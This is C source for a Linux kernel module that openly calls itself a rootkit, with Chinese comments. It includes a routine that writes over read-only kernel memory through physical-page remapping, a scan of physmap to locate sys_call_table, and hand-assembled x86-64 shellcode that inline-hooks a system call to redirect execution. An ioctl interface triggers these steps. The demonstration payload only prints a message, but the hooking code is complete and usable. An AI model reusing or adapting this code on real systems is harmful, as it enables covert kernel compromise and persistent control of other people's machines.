#define _GNU_SOURCE
#include "pwhrootkit.h"
#include <linux/uaccess.h>
#include <linux/init_task.h>
#include <linux/kstrtox.h>
#include <linux/sched.h>
#include <linux/pid.h>

#define USER_KALLSYMS 0x1111
#define SEARCH_SYSCALL 0x2222
#define SUPER_HOOK 0x3333

static size_t syscall_table_data[5];
static size_t get_syscall_data = 0;
static size_t syscall_table_addr;


struct kernel_args{
    void * content;
    int size;
};

/* 使用重映射来修改只读页面 */
static int arbitrary_remap_write(void *dst, void *src, size_t size){
    size_t phys_addr, phys_offset;
    size_t phys_ioremap_addr;
    /* 获取虚拟地址所在物理页帧的首地址 */
    phys_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;
    /* 获取页内地址的偏移 */
    phys_offset = (size_t )dst & 0xfff;
    /* 重新映射该物理地址到另一个虚拟地址 */
    phys_ioremap_addr = (size_t)ioremap(phys_addr, PAGE_SIZE);
    /* 拷贝内容到该虚拟地址,从而间接拷贝到只读物理地址 */
    memcpy((size_t *)(phys_ioremap_addr + phys_offset), src, size);
    /* 最后调用该函数来解除映射 */
    iounmap((size_t *)phys_ioremap_addr);
    return 0;
}

static void sys_call_table_finder(void){
    /* 遍历内核,这里存放特征 */
    /* page_offset_base存放的是physmap的首虚拟地址,从这里开始就可以遍历所有的内核 */
    size_t *phys_mem = (size_t *)page_offset_base;

    char *argv[] = {
        "/sys_table_finder",
        NULL,
    };
    char *envp[] = {
        "HOME=/",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL,
    };
    if(get_syscall_data){
    //    printk(KERN_INFO "[peiwithhao rootkit] already have the sys_call_table at 0x%lx", syscall_table_addr);
        return;
    }

    /* 调用用户态程序 */
    /* UMH_WAIT_PROC这个标识符表示要等用户程序执行完毕 */
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    // if(!get_syscall_data){
    //     panic("failed to get the sycall data from userspace!");
    // }
    for(size_t i = 0;; i++){
        if(phys_mem[i+0] == syscall_table_data[0]
        && phys_mem[i+1] == syscall_table_data[1]
        && phys_mem[i+2] == syscall_table_data[2]
        && phys_mem[i+3] == syscall_table_data[3]
        ){
            syscall_table_addr = (size_t)&(phys_mem[i]);
            printk(KERN_INFO "[peiwithhao rootkit] sys_call_table founded at %lx", syscall_table_addr);
            break;
        }
    }
    get_syscall_data = 1;
}

static void funny_joke(void){
    printk("[peiwithhao rootkit] You are hooked by THE GREAT PEIWITHHAO ;)");
}



//void (*evil_func)(void);

    /*
    void (*evil_func) (void)  = (void (*)(void))hooker_addr;

    evil_func();

    arbitrary_remap_write((void *)(hooked_addr), orig_code, count);
    */

static void hook_king(size_t hooked_addr, void *orig_code, size_t count, size_t hooker_addr, size_t shellcode_addr){
    asm volatile(
        "subq $0x58, %%rsp;"
        "movq %0, %%rdi;"
        "movq %0, %%r15;"
        "movq %1, %%rsi;"
        "movq %2, %%rdx;"
        "movq %3, %%rcx;"
        "movq %4, %%r11;"
        "movq %0, %%r12;"
        "movq %5, %%r13;"
        "movq %2, %%r14;"
        "push %%r15;"
        "push %%r14;"
        "push %%r13;"
        "push %%r12;"
        "push %%r11;"
        "push %%rcx;"
        "call *%4;"
        "pop %%rcx;"
        "call *%%rcx;"

        "pop %%r11;"
        "pop %%r12;"
        "pop %%r13;"
        "pop %%r14;"
        "pop %%r15;"

        "addq $0x58, %%rsp;"
        "pop %%rsp;"
        "pop %%rbp;"
        "pop %%r10;"        //原本是r15
        "pop %%r10;"
        "pop %%r10;"
        "pop %%r10;"
        "pop %%r10;"
        "pop %%r10;"
        "pop %%r9;"
        "pop %%r8;"
        "pop %%rdi;"
        "pop %%rsi;"
        "pop %%rdx;"
        "pop %%rcx;"
        "pop %%rbx;"
        "pop %%rax;"

        "push %%r15;"
        "push %%r14;"
        "push %%r13;"
        "push %%r12;"
        "push %%r11;"

        "call *%%r15;" 

        "pop %%r11;"
        "pop %%r12;"
        "pop %%r13;"
        "pop %%r14;"
        "pop %%r15;"
        "movq %%r12, %%rdi;"
        "movq %%r13, %%rsi;"
        "movq %%r14, %%rdx;"
        "call *%%r11;"
        :
        : "r"(hooked_addr), "r"(orig_code), "r"(count), "r"(hooker_addr), "r"((size_t)arbitrary_remap_write), "r"(shellcode_addr)
        : );
}


static ssize_t pwh_rootkit_read(struct file *file, char __user *buf, size_t count, loff_t * ppos){
    //arbitrary_remap_write((void *)(syscall_table_addr), "peiwithhao", 10);
    return 0;
}

#define SHELLCODE_MAX_NR 1024
static size_t orig_code[SHELLCODE_MAX_NR] = {0};
static u8 shell_code[SHELLCODE_MAX_NR] = {0};

static ssize_t super_hooker(size_t hook_addr, size_t evil_func){
    size_t shellcode_nr;
    size_t index;
    size_t *share_orig;
    size_t *share_shell;
    size_t hook_ctl;
    u8 store_regs[] = {0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x55, 0x54 };
    hook_ctl = (size_t)hook_king;
    //push regs
    shellcode_nr = sizeof(store_regs);
    // mov rdi, *       0x48 0xbf
    shellcode_nr += sizeof(u8) + sizeof(u8);
    shellcode_nr += sizeof(size_t);
    // mov rsi, *       0x48 0xbe
    shellcode_nr += sizeof(u8) + sizeof(u8);
    shellcode_nr += sizeof(size_t);

    // mov rdx, *       0x48 0xba
    shellcode_nr += sizeof(u8) + sizeof(u8);
    shellcode_nr += sizeof(size_t);

    // mov rcx, *       0x48 0xc7 0xc1
    shellcode_nr += sizeof(u8) + sizeof(u8);
    shellcode_nr += sizeof(size_t);


    // mov r8, *       0x49 0xb8
    shellcode_nr += sizeof(u8) + sizeof(u8);
    shellcode_nr += sizeof(size_t);



    // mov rax, *       0x48 0xb8
    shellcode_nr += sizeof(u8) + sizeof(u8);
    shellcode_nr += sizeof(size_t);
    // jmp rax          0xff 0xe0
    shellcode_nr += sizeof(u8) + sizeof(u8);


    /* 保存指令 */
    memcpy((size_t *)orig_code, (size_t *)hook_addr, shellcode_nr);
    share_orig = orig_code;
    share_shell = (size_t *)shell_code;
    
    index = 0;

    /* 保存现场 */
    for(int i = 0; i < sizeof(store_regs) ; i++){
        shell_code[index++] = store_regs[i];
    }

    /* mov rdi, hook_addr */
    shell_code[index++] = 0x48;
    shell_code[index++] = 0xBF;
    for(int i = 0; i < sizeof(size_t) ; i++){
        //写入orig_code的地址
        shell_code[index++] = ((char *)&hook_addr)[i];
    }

    /* mov rsi, orig_code */
    shell_code[index++] = 0x48;
    shell_code[index++] = 0xBE;
    for(int i = 0; i < sizeof(size_t) ; i++){
        //写入orig_code的地址
        shell_code[index++] = ((char *)(&share_orig))[i];
    }

    /* mov rdx, shellcode_nr */
    shell_code[index++] = 0x48;
    shell_code[index++] = 0xBA;
    for(int i = 0; i < sizeof(size_t) ; i++){
        shell_code[index++] = ((char *)&shellcode_nr)[i];
    }

    /* mov rcx, evil_func */
    shell_code[index++] = 0x48;
    shell_code[index++] = 0xB9;
    for(int i = 0; i < sizeof(size_t) ; i++){
        //写入orig_code的地址
        shell_code[index++] = ((char *)&evil_func)[i];
    }

    /* mov r8, shellcode */
    shell_code[index++] = 0x49;
    shell_code[index++] = 0xb8;
    for(int i = 0; i < sizeof(size_t) ; i++){
        shell_code[index++] = ((char *)&share_shell)[i];
    }

    /* mov rax, shellcode */
    shell_code[index++] = 0x48;
    shell_code[index++] = 0xB8;
    for(int i = 0; i < sizeof(size_t) ; i++){
        shell_code[index++] = ((char *)&hook_ctl)[i];
    }
    /* jmp rax */
    shell_code[index++] = 0xFF;
    shell_code[index++] = 0xE0;


    arbitrary_remap_write((void *)hook_addr, shell_code, shellcode_nr);

    return 0;
}

static ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
    //void *hook_ptr = funny_joke;
    // size_t poll_addr;
    //
    // /* 寻找系统调用表 */
    // sys_call_table_finder();
    printk(KERN_INFO "sys_read_addr: 0x%lx", ((size_t *)syscall_table_addr)[1]);
    // poll_addr = ((size_t *)syscall_table_addr)[217];
    // super_hooker(poll_addr, (size_t)&funny_joke);
    //arbitrary_remap_write((void *)poll_addr, shellcode, sizeof(shellcode));
    return 0;
}

static long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
    size_t hooked_addr;
    int ret;
    switch(cmd){
        case USER_KALLSYMS:
            ret = copy_from_user(syscall_table_data, (void *)arg, sizeof(syscall_table_data));
            break;
        case SEARCH_SYSCALL:
                /* 寻找系统调用表 */
            sys_call_table_finder();
            break;
        case SUPER_HOOK:
                /* 寻找系统调用表 */
            sys_call_table_finder();
            hooked_addr = ((size_t *)syscall_table_addr)[21];
            super_hooker(hooked_addr, (size_t)&funny_joke);
            //arbitrary_remap_write((void *)poll_addr, shellcode, sizeof(shellcode));
            break;
        default:
            break;
    }
    return 0;
}
/* 打开类容 */
static int pwh_rootkit_open(struct inode *inode, struct file *file){
    return 0;
}
static int pwh_rootkit_release(struct inode *inode, struct file *file){
    return 0;
}
